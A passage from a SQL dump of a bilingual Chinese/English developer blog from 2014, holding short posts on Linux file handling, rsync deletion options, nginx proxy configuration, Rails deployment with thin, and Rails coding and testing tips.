</p>\r\n',0,'2014-03-15 10:34:00','2014-03-15 10:48:01','2014-03-15 10:49:50',1,NULL,'nginx-try-files-and-rewrite-tips','','','',670,'nginx-try-files-and-rewrite-tips'),(230,'Fast way to delete files in linux (快速删除大量文件的方式）','<p> refer to: <a href=\"http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux\" target=\"_blank\">http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux</a>\r\n</p>\r\n<p>result:  (conclusion:  using find is the safe way,  perl is the fastest, rsync is not a bad choice )\r\n\r\n</p>\r\n<pre>COMMAND	TIME TAKEN\r\nRM Command	Is not capable of deleting large number of files\r\nFind Command with -exec	14 Minutes for half a million files\r\nFind Command with -delete	5 Minutes for half a million files\r\nPerl	1 Minute for half a million files\r\nRSYNC with -delete	2 Minute 56 seconds for half a million files\r\n</pre>\r\n\r\n',0,'2014-03-17 07:07:00','2014-03-17 07:10:47','2014-03-17 07:10:47',1,NULL,'fast-way-to-delete-files','','','',443,'fast-way-to-delete-files'),(231,'find how many files in a folder (快速查看某个目录下有多少文件）','<p>有个项目会写静态文件，结果发现一次就要写22W个文件。。。。 用LS根本无法实现，所以。。。 ( if there are a huge number of files in a folder , you can\'t use \'ls\' to find files, instead, we should use : find. &#160;)&#160;</p>\r\n<pre>sg552@youku:/sg552/workspace/test_nginx/static_files_popup_page$ find . -type f | wc -l\r\n220164\r\n\r\nsg552@youku:/sg552/workspace/test_nginx/static_files_popup_page$ du . -h\r\n906M	.\r\n</pre>',0,'2014-03-18 02:49:00','2014-03-18 02:51:59','2014-03-18 02:54:33',1,NULL,'find-how-many-files-in-folder','','','',443,'find-how-many-files-in-folder'),(232,'bundle install gems from local folder (bundle 从本地安装gem ) ','<p>refer to :<a href=\"http://bundler.io/v1.5/bundle_install.html\">http://bundler.io/v1.5/bundle_install.html</a>, <a href=\"http://bundler.io/v1.5/bundle_package.html\">http://bundler.io/v1.5/bundle_package.html</a> </p>\r\n<p>基本上，就是先使用 &#160; (first step, you should package the gems to vendor/cache folder)</p>\r\n<p>$ bundle package &#160;# &#160;自动把安装好的gem打包放到 vendor/cache目录下，</p>\r\n<p>$ bundle install --local # 就会从这个目录下安装gem file &#160; ( and then, install the gems from your local vendor/cache folder )&#160;</p>\r\n<p>另外， 在服务器上要注意： (also, notice that if you want to install gems in your production server: &#160;)&#160;</p>\r\n<p>$ bundle install --deployment #会安装gem 到服务器上。 这种安装是：把所有的gem都装到vendor/bundle文件夹中。而不是 ~/.gem 文件夹。 &#160;&#160;</p>\r\n<p>$ bundle install --without development test 也适合安装gem 到服务器。 &#160;</p>',0,'2014-03-25 23:11:00','2014-03-25 23:23:33','2014-03-25 23:23:33',1,NULL,'bundle-install-gems-from-local-folder','','','',525,'bundle-install-gems-from-local-folder'),(233,'deleting files in rsync ( rsync 中的delete)','<p>最近要使用rsync 来同步接近大小1G，总共50W个的文件。由于需要保证服务器上一直有对应的文件存在，  <a href=\"http://weibo.com/PrincipalArchitect\">\r\n 杰杰 </a>&#160;问我rsync 的上传/删除文件的 具体顺序是怎样的。 我当时不清楚，所以赶紧学习了下： （ in my job, I need to rsync 500, 000 files to a server , totally in 1 GB file size. and I used the --delete option, so it\'s very important for me to know how rsync delete files)&#160;</p>\r\n<p>总结： 应该使用 --delete --delete-after 选项。（两个同时存在）</p>\r\n<p>$ man rsync :&#160;</p>\r\n<p>              The --delete option may be combined with  one  of  the  --delete-WHEN  options<br />              without  conflict,  as  well  as  --delete-excluded.   However, if none of the<br />              --delete-WHEN options are specified, rsync  will  choose  the  --delete-during<br />              algorithm  when talking to rsync 3.0.0 or newer, and the --delete-before algo‐<br />              rithm  when  talking  to  an  older  rsync.   See  also   --delete-delay   and<br />              --delete-after. &#160; &#160; &#160; ( 也就是说， --delete 选项可以跟 --delete-WHEN 一起使用，如果不指定 --delete-WHEN的话，就会默认使用 --delete-during 算法）</p>\r\n<p>       --delete-before<br />              Request  that  the  file-deletions  on  the  receiving side be done before the<br />              transfer starts.   See  --delete  (which  is  implied)  for  more  details  on<br />              file-deletion. &#160;( 在 接收方收到文件之前，先删掉 多余的文件。 适合 接收方磁盘空间不够的情况）<br /></p>\r\n<p>      --delete-during, --del<br />              Request that the file-deletions on the receiving side be done incrementally as<br />              the transfer happens.  The per-directory delete scan is done right before each<br />              directory  is  checked  for  updates,  so  it  behaves  like  a more efficient<br />              --delete-before, including doing the deletions prior to any per-directory fil‐<br />              ter  files being updated. &#160;（ 应该是 在每一个子目录被上传之前，先删掉目标目录中的文件。应该是一种 --delete-before. ）</p>\r\n<p>      --delete-delay （太长没看懂。。。需要先动手试一下，估计是先上传，再执行删除。。。）<br />              Request that the file-deletions on the receiving side be computed  during  the<br />              transfer  (like  --delete-during),  and  then  removed after the transfer com‐<br />              pletes.  This is useful when combined with --delay-updates and/or --fuzzy, and<br />              is more efficient than using --delete-after (but can behave differently, since<br />              --delete-after computes the deletions in a separate pass after all updates are<br />              done).   If the number of removed files overflows an internal buffer, a tempo‐<br />              rary file will be created on the receiving side  to  hold  the  names  (it  is<br />              removed while open, so you shouldn’t see it during the transfer).  If the cre‐<br />              ation of the temporary file fails, rsync  will  try  to  fall  back  to  using<br />              --delete-after  (which  it  cannot  do  if --recursive is doing an incremental<br />              scan).  See --delete (which is implied) for more details on file-deletion. &#160;</p>\r\n<p>       --delete-after (先上传， 再删除文件）<br />              Request that the file-deletions on the receiving side be done after the trans‐<br />              fer  has completed.  This is useful if you are sending new per-directory merge<br />              files as a part of the transfer and you want their exclusions to  take  effect<br />              for the delete phase of the current transfer.  It also forces rsync to use the<br />              old, non-incremental recursion algorithm that requires rsync to scan  all  the<br />              files  in  the  transfer  into memory at once (see --recursive).  See --delete<br />              (which is implied) for more details on file-deletion.<br /><br /></p>',0,'2014-03-27 21:08:00','2014-03-27 21:28:53','2014-03-27 21:28:53',1,NULL,'deleting-files-in-rsync','','','',621,'deleting-files-in-rsync'),(234,'使用 gzip 来压缩文件 (using gzip to compress file)','<p>非常简单。 &#160;&#160;</p>\r\n<p>$ gzip &lt;target_file&gt; 就可以了。关键是 目标文件会被删掉。生成个新的.gz文件。 &#160;( remember: the original file will be replaced by a newly generated .gz file )&#160;</p>\r\n<p>如果想保留源文件的话，就可以使用 --stdout &#160; ( use --stdout to keep the original file)&#160;</p>\r\n<p>$ gzip &lt;target_file&gt; &#160;--stdout &gt; log.gz &#160;</p>',0,'2014-04-01 00:42:00','2014-04-01 00:45:16','2014-04-01 00:45:16',1,NULL,'using-gzip-to-compress-file','','','',402,'using-gzip-to-compress-file'),(235,'使用 nginx + thin 的配置启动 rails server. ( using nginx + thin to serve rails app) ','<p>1.  nginx 中做如下配置：\r\n</p>\r\n<pre>     server {\r\n         listen 80;\r\n         charset utf-8;\r\n         location / {\r\n             proxy_pass          http://rails_servers;\r\n             proxy_redirect      default;\r\n             proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\r\n             proxy_set_header    X-Real-IP $remote_addr;\r\n             proxy_set_header    Host $http_host;\r\n             proxy_next_upstream http_502 http_504 error timeout invalid_header;\r\n        }\r\n     }\r\n     upstream rails_servers{\r\n            server 127.0.0.1:6661;\r\n            server 127.0.0.1:6662;\r\n            server 127.0.0.1:6663;\r\n            server 127.0.0.1:6664;\r\n     }\r\n</pre>\r\n\r\n重启 nginx:  \r\n<pre>  $ nginx -t  （测试一下配置文件）\r\n  $ nginx -s reload\r\n</pre>\r\n\r\n<p>2. 使用 配置文件来启动 thin: </p>\r\n<p>    2.1. 建立 <rails.folder>/config/thin.yml  , 内容如下： </rails.folder></p>\r\n<pre>---\r\nchdir: \'/opt/app/ruby/m-cms-for-tudou/current\'  #  这里需要修改。\r\nenvironment: production\r\naddress: 0.0.0.0\r\nport: 6661\r\ntimeout: 30\r\nlog: log/thin.log\r\npid: tmp/pids/thin.pid\r\nmax_conns: 1024\r\nmax_persistent_conns: 512\r\nrequire: []\r\nwait: 30\r\nservers: 4\r\ndaemonize: true\r\n</pre>\r\n<p>    2.2. 启动thin:  (记得Gemfile  中要有  gem  \'thin\'  ) </p>\r\n<pre>    $ bundle exec thin start -C config/thin.yml\r\n</pre>\r\n\r\n<p>    2.3. 记得在 config/environments/production.rb文件中：  (以后可以使用nginx来 配置，处理静态文件。现在先这样弄着） </p>\r\n<pre>Cms::Application.configure do\r\n    config.serve_static_assets = true\r\nend\r\n</pre>\r\n就可以了。',0,'2014-04-01 01:18:00','2014-04-01 01:21:22','2014-04-01 01:21:22',1,NULL,'nginx-and-thin-to-server-rails-app','','','',536,'nginx-and-thin-to-server-rails-app'),(236,'设置 rails 使用中国大陆时间（set Rails using Beijing Time)','insert \"    config.time_zone = \'Asia/Harbin\'\" into your config/application.rb\r\n\r\n<pre># config/application.rb\r\nmodule MCacheCleaner\r\n  class Application &lt; Rails::Application\r\n    config.time_zone = \'Asia/Harbin\'\r\n  end \r\nend\r\n</pre>',0,'2014-04-03 00:38:00','2014-04-03 00:40:41','2014-04-03 00:40:41',1,NULL,'set-rails-using-beijing-time','','','',413,'set-rails-using-beijing-time'),(237,'使用 god + delayed_job是，不要使用 god的 keep_alive选项 ( don\'t use god\'s keep alive option when using god controlling delayed_jobs) ','<p>因为delayed_job有休眠时间。god会不断的唤醒它。。</p>\r\n\r\n<p>God is always trying to start delayed_job every 5 seconds by default: </p>\r\n<p> God\'s log file: </p>\r\n<pre> 23 ERROR: there is already one or more instance(s) of the program running\r\n 24 ERROR: there is already one or more instance(s) of the program running\r\n 25 ERROR: there is already one or more instance(s) of the program running\r\n 26 ERROR: there is already one or more instance(s) of the program running\r\n 27 ERROR: there is already one or more instance(s) of the program running\r\n 28 ERROR: there is already one or more instance(s) of the program running\r\n 29 ERROR: there is already one or more instance(s) of the program running\r\n 30 ERROR: there is already one or more instance(s) of the program running\r\n</pre>\r\n\r\n<p>so the solution is simply don\'t use \"keepalive=true\" option.\r\n</p>\r\n<pre>RAILS_ROOT = \'/sg552/workspace/m-api-cache-cleaner\'\r\nGod.watch do |w| \r\n  w.name = \'cache_cleaner\'\r\n  w.dir = RAILS_ROOT\r\n  w.start = \"bundle exec bin/delayed_job start\"\r\n  w.log = \"#{RAILS_ROOT}/log/cache_cleaner_stdout.log\"\r\n  # 不需要为 delayed_job 指定这个参数。因为delayed_job有休眠时间。god会不断的唤醒它。。\r\n#  w.keepalive\r\nend\r\n</pre>',0,'2014-04-03 00:59:00','2014-04-03 01:20:20','2014-04-03 01:20:20',1,NULL,'do-not-using-keepalive-option-when-using-god-controlling-delayed-jobs','','','',452,'do-not-using-keepalive-option-when-using-god-controlling-delayed-jobs'),(238,'OCR online for chinese(可以在线识别文字的服务）','<p>这个东西真的很好用，google一下出来一堆，随便找了一个： <a href=\"http://www.newocr.com/\" target=\"_blank\">http://www.newocr.com/</a>&#160; &#160; ( there\'re many services for OCR online)</p>\r\n<p>用起来非常简单： ( quite simple to use: )</p>\r\n<p>1. 上传图片 &#160;( upload an image containing the characters )</p>\r\n<p>2. 点击 ORC按钮 &#160;( click the orc button)&#160;</p>\r\n<p>3. 出现识别结果。 &#160;( show the results)&#160;</p>\r\n<p>准确率稍差，大约60% ～70%吧，但是比手敲的感觉好多了～ &#160;(thought it\'s only 60%~70% rate of correct result, but it\'s good enough for me )</p>',0,'2014-04-10 01:09:00','2014-04-10 01:13:00','2014-04-10 01:13:00',1,NULL,'ocr-online-for-chinese','','','',492,'ocr-online-for-chinese'),(239,'使用 goaccess分析nginx日志（analyze Nginx log using GoAccess)','<p>nginx 日志无法用rails-request-analyzer 来分析。 需要使用 goaccess 。 因为前者一分析就死机，后者速度更快，分析1.2G的日志大约20秒。 ( if you want to analyze nginx log, use GoAccess)</p>\r\n<p>用法非常简单： &#160;(quite simple to use)&#160;</p>\r\n\r\n<pre>$ goaccess -f &lt;your_log_file&gt; -a &gt; result.html\r\n</pre>\r\n<p>但是goaccess的一个缺点是： &#160;分析大日志时，如果你的机器内存太小，就会报错退出。例如，你的机器是4G内存，但是要分析的内容是7G大小，这时候就会 在机器运行2，3分钟，接近死机是，出现 Killed 的结果（还好GoAccess会自动 干掉这个进程 ) &#160;( but it\'s a weakpoint that goaccess can\'t analyze big file, e.g. 7G size. &#160;)&#160;</p>\r\n<p>所以解决办法是： 1. 把大日志切成小文件。 &#160;2. 分析小文件。</p>\r\n<p>$ split -b 2G &lt;your_log_file&gt;</p>\r\n<p>$&#160;</p>',0,'2014-04-14 01:41:00','2014-04-14 02:58:55','2014-04-14 02:58:55',1,NULL,'analyze-nginx-log-using-goaccess','','','',1345,'analyze-nginx-log-using-goaccess'),(240,'调试RAILS程序的经验 ( experience of debugging rails)','<p>1. 看日志。&#160; <br />1.1 日志的格式很重要，务必要有时间戳。有exception traceback, 有 Completed 时间<br /><br />1.2 rails log跟 stdout put 有时候会分别写到两个不同的文件当中。 如果rails log 没有信息，那么就要看 stdoutput 的信息（如果你用的是thin服务器的话，就要看 thin.yml 中的配置了)&#160; 我们的经验是: libv8引起的错误，会直接打到 stdoutput 中。<br /><br />1.3 看nginx 日志。 当并发访问量特别大的时候（1000 req/s ） 这个时候看rails 日志是不报错的， 但是速度很慢。 nginx access日志就能看到些端倪。&#160; <br /><br />1.4 看top.&#160; 如果发现在 并发访问量特别大的时候， rails 进程的CPU 占用率特别高，就要小心了。赶紧静态化，或者使用缓存～<br /><br />1.5 使用grep, 例如： $ grep \'FATAL\' &lt;your_rails_log&gt;. 就会看到所有出错的地方。</p>\r\n<p>2. 发现问题根源找到了，需要重启RAILS。否则很多僵死的进程会一直占用资源。</p>',0,'2014-04-25 02:09:00','2014-04-25 02:14:52','2014-04-25 02:16:30',1,NULL,'experience-of-debugging-rails','','','',390,'experience-of-debugging-rails'),(241,'from Rails3 to Rails4, set_table_name, set_primary_key is deprecated.','<p>RAILS3的两个方法在RAILS4 中用不了： &#160;set_table_name, set_primary_key.&#160;</p>\r\n<p>we should use #table_name =  instead of #set_table_name. &#160;&#160;</p>\r\n<p> otherwise you will get undefined method `set_primary_key\' for #&lt;Class:0x37132e0&gt; </p>\r\n\r\n<pre> class CmsClientPid &lt; CmsActiveRecord\r\n-  set_table_name \"cms_client\"\r\n-  set_primary_key :pid\r\n+  self.table_name = \"cms_client\"\r\n+  self.primary_key = \'pid\'\r\n</pre>\r\n<p>refer to: <a target=\"_blank\" href=\"http://stackoverflow.com/questions/20386636/rails-set-primary-key-error\">http://stackoverflow.com/questions/20386636/rails-set-primary-key-error</a>\r\n</p>',0,'2014-04-29 06:58:00','2014-04-29 07:06:36','2014-04-29 07:08:36',1,NULL,'set-table-name-is-deprecated-in-rails4','','','',550,'set-table-name-is-deprecated-in-rails4'),(242,'jQuery.shorten 一个非常不错的折叠长文本的插件。','<p>How to toggle a long text using jQuery?  <a href=\"https://github.com/viralpatel/jquery.shorten\">jquery.shorten </a>\r\n</p>\r\n\r\nrefer to: <a target=\"_blank\" href=\"http://stackoverflow.com/questions/5270227/how-to-hide-show-more-text-within-a-certain-length-like-youtube\">http://stackoverflow.com/questions/5270227/how-to-hide-show-more-text-within-a-certain-length-like-youtube</a>\r\n\r\n<pre>&lt;div&gt;\r\n   very very very long texttttttttttttttttttttttttt.....\r\n&lt;/div&gt;\r\n\r\n$(element).shorten()\r\n</pre>\r\n\r\n<img src=\"https://camo.githubusercontent.com/8bd6f34416a2976f7dabf68c40d699eb0f73a9b0/687474703a2f2f696d672e766972616c706174656c2e6e65742f323031302f31322f73686f772d6d6f72652d6c696e6b2e706e67\" />',0,'2014-04-30 05:46:00','2014-04-30 05:51:12','2014-04-30 05:51:12',1,NULL,'jquery-shorten','','','',716,'jquery-shorten'),(243,'uncompress a tar.gz2 file','<p>Installing VIM 7.3 steps:</p>\r\n<pre>$ wget ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2\r\n$ bunzip2 vim-7.3.tar.bz2\r\n$ tar xvf vim-7.3.tar\r\n</pre>\r\n<p>so easy.&#160;</p>',0,'2014-05-05 06:26:00','2014-05-05 06:28:35','2014-05-05 06:28:35',1,NULL,'uncompress-tar-gz2-file','','','',284,'uncompress-tar-gz2-file'),(244,'在nginx转发时保留原始域名( keep the Host header via nginx proxy_pass  )','<p>最近的子项目越来越多，但是只有一个域名， 在做了nginx的跳转之后， 发现原来的域名会丢失，取代出现的是IP。</p>\r\n<p>(with the growth of the sub-systems of my current project, there is a problem occurred: the origin domain name disappeared and it is replaced by the ip addresses , which is not liked by my workmates. &#160;)&#160;</p>\r\n<p>所以我们要保留原始域名，这货也叫 Host header. &#160;（so the solution is to keep the origin domain name . aka host Header. &#160;）</p>\r\n\r\n<p> solution is : proxy_set_header Host $http_host;  </p>\r\n<pre>    server {\r\n        listen 80; \r\n        # this is the key !!!!! \r\n        proxy_set_header Host $host;\r\n        location /client/pids {\r\n            proxy_pass http://10.103.13.103:3200/client/pids;\r\n        }\r\n        location /interface/client/pids {\r\n            proxy_pass http://10.103.13.103:3200/interface/client/pids;\r\n        }\r\n        ......\r\n</pre>\r\n<p> refer to: <a href=\"https://www.simplicidade.org/notes/archives/2011/02/nginx_proxy_host_header.html\" target=\"_blank\">https://www.simplicidade.org/notes/archives/2011/02/nginx_proxy_host_header.html</a> and \r\n<a href=\"http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header\" target=\"_blank\">http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header</a> </p>',0,'2014-05-07 01:41:00','2014-05-07 01:50:07','2014-05-07 01:50:07',1,NULL,'keep_host_header_via_nginx_proxy_pass','','','',435,'keep_host_header_via_nginx_proxy_pass'),(245,'RAILS 3.0.x 安装plugin :  install rails plugin for rails 3.0.x ( Commands is not a module (TypeError) )','<p>今天在安装 rails 3.0.x 的plugin 时发现问题： &#160; ( I met a problem when installing plugin for rails 3.0.x project)&#160;</p>\r\n<p>Commands is not a module (TypeError)</p>\r\n<p>搜索了一下，这个是rake的BUG。 &#160;解决方法如下： &#160;( it seems it\'s a bug of Rake )&#160;</p>\r\n\r\n<pre>1. 编辑  Rakefile: \r\n  require File.expand_path(\'../config/application\', __FILE__)\r\n  require \'rake\'\r\n  # 增加这一行，注意位置。\r\n  include Rake::DSL \r\n2.编辑： script/rails: \r\n  APP_PATH = File.expand_path(\'../../config/application\',  __FILE__)\r\n  require File.expand_path(\'../../config/boot\',  __FILE__)\r\n  # 增加这一行，注意位置。\r\n  module Commands; end\r\n  require \'rails/commands\'\r\n3.then run this command:\r\n  $ bundle exec rails plugin install git://github.com/sbecker/asset_packager.git\r\n</pre>\r\n<p>\r\nrefer to:&#160;<a href=\"http://stackoverflow.com/a/23507780/445908\" title=\"http://stackoverflow.com/a/23507780/445908\" target=\"_blank\">http://stackoverflow.com/a/23507780/445908</a>\r\n</p>',0,'2014-05-07 02:42:00','2014-05-07 02:45:59','2014-05-07 02:45:59',1,NULL,'install-rails3-plugin','','','',354,'install-rails3-plugin'),(246,'rails 3.0 压缩 javascript 和 css ( compress css/js in rails 3.0- )','<p>压缩 javascript 和 css &#160;<br />参考 (refer to )： <a href=\"http://stackoverflow.com/questions/7112218/how-to-install-a-plugin-in-rails-3-getting-a-commands-is-not-a-module-typeerro/23507780#23507780\">http://stackoverflow.com/questions/7112218/how-to-install-a-plugin-in-rails-3-getting-a-commands-is-not-a-module-typeerro/23507780#23507780</a>\r\n</p>\r\n<p>1. 编辑  Rakefile: &#160; (edit Rakefile)&#160;</p>\r\n<p>require File.expand_path(\'../config/application\', __FILE__)</span>\r\n<br />  require \'rake\'</p>\r\n<p># 增加这一行，注意位置。 &#160;( add this line of code)&#160;</span>\r\n<br />  include Rake::DSL&#160;</p>\r\n<p><br />2.编辑： script/rails: &#160;<br />  APP_PATH = File.expand_path(\'../../config/application\',  __FILE__)<br />  require File.expand_path(\'../../config/boot\',  __FILE__)<br />  # 增加这一行，注意位置。 &#160;(add this line of code)&#160;<br />  module Commands; end<br />  require \'rails/commands\'</p>\r\n<p><br />3.then run this command:</p>\r\n<p>  $ bundle exec rails plugin install git://github.com/sbecker/asset_packager.git<br />\r\n\r\n</p>\r\n<p>4. 编辑： 新增一个 yml 文件， 把你用到的JS， CSS文件放到里面去： $ cat config/asset_packages.yml &#160;( create a yml file as below)&#160;</p>\r\n<pre>---\r\njavascripts:\r\n- base:\r\n  - jquery-1.9.1.min\r\n  - bootstrap.min\r\n  - jquery-migrate-1.1.1\r\n  - jquery-ui-1.10.1.custom.min\r\n  - jquery-ujs-for-jquery-1.9\r\n  - jquery.treeview\r\n  - jquery.toastmessage\r\n  - jquery.tooltip\r\n  - jquery-autocomplete-combobox\r\n  - jquery.uploadify\r\n  - jquery-ui-timepicker-addon\r\n  - jquery.ui.datepicker-zh-CN\r\n  - select2\r\n  - select2_locale_zh-CN\r\n  - global\r\n  - jquery.tagit\r\n  - jquery.validate\r\n  - jqueryui-editable\r\n  - jquery.ui.widget\r\n\r\nstylesheets:\r\n- base:\r\n  - style\r\n  - invalid\r\n  - reset\r\n  - jquery.treeview\r\n  - jquery-ui-1.10.1.custom\r\n  - jquery.toastmessage\r\n  - jquery-autocomplete-combobox\r\n  - uploadify\r\n  - select2\r\n  - jquery.tagit\r\n  - jquery.validate\r\n  - cms\r\n  - jqueryui-editable\r\n  - bootstrap.min\r\n  - customized_bootstrap\r\n</pre>\r\n<p>\r\n\r\n5. 在 布局文件(origin.html.erb)中： ( in your layout file)&#160;</p>\r\n<pre>&lt;%= raw stylesheet_link_merged :base %&gt;\r\n&lt;%= raw javascript_include_merged :base %&gt;\r\n</pre>\r\n<p>\r\n就可以了。 (done)&#160;</p>\r\n<p>更多，见： &#160;(refer to ) https://github.com/sbecker/asset_packager</p>',0,'2014-05-07 05:27:00','2014-05-07 05:32:13','2014-05-07 05:32:13',1,NULL,'compress-css-and-js-in-rails3-without-asset-pipeline','','','',310,'compress-css-and-js-in-rails3-without-asset-pipeline'),(247,'config/routes.rb中，root路径要放在下面，否则会引起分页链接错误 (root path with karminari) ','<p> 今天很奇怪，遇到一个问题： kaminari 在分页时 ，如果 被分页内容是 root_path, 那么在分页helper中的路径，\r\n就不是完整的。形式（例如  /client/pids?page=2 ) ，而是以 \'/？page=2\'  这样的形式显示。 ( today I met a problem caused by a root_path declaration in the top of my routes.rb file . &#160;the problem is : the links in pagination helper is not displayed as standard path, but a root path)&#160;</p> \r\n\r\n<p> 解决办法： 把 config/routes.rb中的 root声明放在 下面 ( the solution is: simply put the \'root\' declaration to the bottom of the page)&#160;</p> \r\n<pre># in config/routes.rb  \r\n-  root :to =&gt; \'client/pids#index\'\r\n+  #root :to =&gt; \'client/pids#index\'\r\n   match \'/logout\' =&gt; \"users#logout\", :as =&gt; :logout\r\n   namespace \"client\" do\r\n     resources \"vendors\", \"pids\", \"os\", \"pid_logs\",\r\n     ......\r\n     end\r\n   end\r\n \r\n+  root :to =&gt; \'users#index\'\r\n\r\n</pre>',0,'2014-05-10 02:49:00','2014-05-10 02:53:51','2014-05-10 02:53:51',1,NULL,'root-path-with-kaminari','','','',376,'root-path-with-kaminari'),(248,'优先使用接口，还是优先复制代码?  (coupling? v.s. copying )','<p>今天遇到个问题： &#160;( today I met a problem: --- exactly, yesterday.)</p>\r\n<p>有两个子系统： A ， B。 &#160;我希望在A中使用B的一个既有的功能。 B中的这个功能，以接口的形式提供。 &#160;( I have 2 systems: A and B. I want A has a function that B already implemented as a HTTP interface)&#160;</p>\r\n<p>A 和B共用一个数据库（也就是说，A可以直接读取B的数据） ( A and B share a same database )&#160;</p>\r\n<p>问题： 是应该让A通过 http 直接访问B的接口， 还是把B的代码复制到A中，让A直接调用？ &#160;( my question is: how to choose? (1) let A visit B\'s http interface &#160;(2) copy B\'s code to A. )</p>\r\n<p>答案： (my final solution)&#160;</p>\r\n<p>最理想的情况下，如果B系统永远稳定运行，接口永远不变，那么必然使用第一种办法。 ( if B is promised to run 24x7 , and its interface will never change, let\'s choose option(1) )&#160;</p>\r\n<p>但是实际情况是：B的接口不稳定，可能会当机， 为了让A自己保持稳定(与B系统解藕），所以我的选择是在B中做个重构，把代码逻辑放到 client.rb文件中，然后把这个client.rb文件复制到A中，这样A就可以直接使用这个文件了。（更合适的办法，是把client.rb这个文件 做成一个gem, 这样A和B的代码就可以做到同步了） (but in the real world, B\'s interface is not stable at all, it may changes, it may get down. To make sure A is decoupled from B, I firstly did some &#160;refactoring(move method from controller to model) , then copied B\'s model to A. (they have the same infrastructure, so the model code could be reused without any modification) &#160;Now A has the same code with B) &#160;--- and another thing, if I could make that duplicated-code a rubygem, then things will be perfect. ) &#160;</p>\r\n<p>结论： 思路不能教条，要根据实际情况选择最合适的 办法。 &#160;( conclusion: &#160;there\'s no silver bullet, let\'s choose the best approach by the real situation. )&#160;</p>',0,'2014-05-10 23:45:00','2014-05-10 23:57:45','2014-05-10 23:57:45',1,NULL,'coupling-vs-copying','','','',280,'coupling-vs-copying'),(249,'UBUNTU下细微调节显示器亮度 （fine adjustment for Monitor in ubuntu ）','<p>最近发现自己有需要微调显示器亮度的需求。因为在黑暗环境下，默认提供的亮度太亮了，我需要再暗点儿。</p>\r\n<p>参考：<a href=\"http://www.maketecheasier.com/configure-screen-brightness-in-ubuntu/\" target=\"_blank\">http://www.maketecheasier.com/configure-screen-brightness-in-ubuntu/</a>\r\n</p><p>1. $&#160;sudo apt-get install xbacklight</p>\r\n<p>2. $&#160;xbacklight -set 40 &#160;(40% brightness)&#160;</p>',0,'2014-05-10 23:57:00','2014-05-11 00:01:44','2014-05-11 00:01:44',1,NULL,'adjust-brightness-in-ubuntu','','','',275,'adjust-brightness-in-ubuntu'),(250,'bulk insert/delete in Rails3/4 (Rails3/4中的批量删除）','<p>批量删除： (bulk delete)&#160;</p>\r\n<pre># if a plan has 100K target_urls:   (如果一个plan 有 100K 个 target_urls ) \r\n# never use:   （绝对不要这样做） \r\n#@plan.target_urls.clear\r\n# you should use: \r\nTargetUrl.delete_all(:plan_id =&gt; @plan.id) \r\n</pre>\r\n\r\n<p>批量增加： &#160;使用 gem: <a href=\"https://github.com/zdennis/activerecord-import/wiki/Examples\" target=\"_blank\">activerecord-import </a> </p>\r\n<pre>1. in Gem file: \r\ngem \'activerecord-import\', \'~&gt; 0.5.0\'\r\n\r\n2. in controller:\r\n   \r\n    target_url_entities = []\r\n    urls.each do |url_to_request|\r\n      target_url_entities &lt;&lt; TargetUrl.new(:url =&gt; url_to_request, :plan_id =&gt; @plan.id)\r\n    end \r\n    TargetUrl.import target_url_entities, :validate =&gt; false\r\n</pre>\r\n<p>refer to:  <a href=\"https://github.com/zdennis/activerecord-import/wiki/Examples\" target=\"_blank\"> https://github.com/zdennis/activerecord-import/wiki/Examples </a>\r\n</p>\r\n',0,'2014-05-11 07:58:00','2014-05-11 08:04:38','2014-05-11 08:04:38',1,NULL,'bulk-insert-delete-in-rails','','','',633,'bulk-insert-delete-in-rails'),(251,'同一个方法的不同声明形式( same method in different declarations ) ','<p>之前脑子里一直知道 TDD 会产生设计良好的代码。 但是一直没有落实到纸面上。今天早上遇到了同样的问题，所以现在赶紧记录下来。 ( all over the time, &#160;I know that TDD give us \"fine designed code\". &#160;however I haven\'t write my experience. This morning I had the chance and now write it down )</p>\r\n<p>假设我们有两个对象： TargetUrl , Plan &#160; &#160;( assuming we have 2 objects: )</p>\r\n<pre>class TargetUrl  \r\n  belongs_to :plan\r\n  attr_accessible :url\r\nend\r\n\r\nclass Plan\r\n  attr_accessible :naming_urls\r\nend\r\n</pre>\r\n<p>然后我们希望 在TargetUrl中有一个方法，可以根据当前的URL返回 一个file_name: ( and I need TargetUrl has a method: generate a file_name according to its \'url\' )&#160;</p>\r\n<pre>    url = \"http://site.com/popup_page?foo=111&amp;bar=222\"\r\n    @plan = Plan.create(:naming_rule =&gt; \'\r\n      @file_name = \"foo-#{@params[:foo]}-bar-#{@params[:bar]}\"\r\n    \'\r\n    @target_url = TargetUrl.create(:url =&gt; url, :plan_id =&gt; @plan.id)\r\n</pre>\r\n<p>\r\n\r\n于是，我发现自己在写代码的时候，写出了两个形式的代码： ( so I found that I wrote 2 declarations of this method)&#160;</p>\r\n<pre>#  直接拿来就写：  （先写实现：)   ( form 1. implementation first , no TDD here) \r\ndef generate_file_name_by_url   ( 这里没有参数）\r\n    url = self.url\r\n    naming_rule = self.plan.naming_url\r\n    # ... other code\r\nend\r\n</pre>\r\n<p>\r\n# 然后它难于测试（在测试之前，需要建立各种model, 想好它们的关系， 先建立plan, 再建立target_url 。而且在方法调用时不知道它使用了哪些变量（都深深的隐藏在instance 中） )，  ( then I found it hard to test: I need to setup all the related models and make a method call which is not so easy to see what variables it is using) </p>\r\n\r\n<pre># 想了想， 觉得似乎这个方法可以写成一个通用的方法，改成这样：  ( so I change it to a ClassMethod) def TargetUrl.generate_file_name_by_url  url, naming_rule  \r\nend\r\n\r\n# 所以，老老实实的使用TDD 方式， ( in the TDD way: )\r\n  # 先写测试：   (spec first) \r\n  before do\r\n     #...\r\n     url = \"http://site.com/popup_page?foo=111&amp;bar=222\"\r\n    @plan = Plan.create(:naming_rule =&gt; \'\r\n      @file_name = \"foo-#{@params[:foo]}-bar-#{@params[:bar]}\"\r\n    \'\r\n    @target_url = TargetUrl.create(:url =&gt; url, :plan_id =&gt; @plan.id)\r\n    #... \r\n  end\r\n  it \'should get_file_name_by_url\' do\r\n    file_name = TargetUrl.generate_file_name_by_url @target_url.url, @plan.naming_rule\r\n    @params = Rack::Utils.parse_query(URI(@target_url.url).query).to_options\r\n    file_name.should == \"foo-#{@params[:foo]}-bar-#{@params[:bar]}\"\r\n  end\r\n\r\n  # 再写实现，发现 class_method 形式是不合理的： ( then I found class method is not suitable here) \r\n  def TargetUrl.generate_file_name_by_url url, naming_rule\r\n    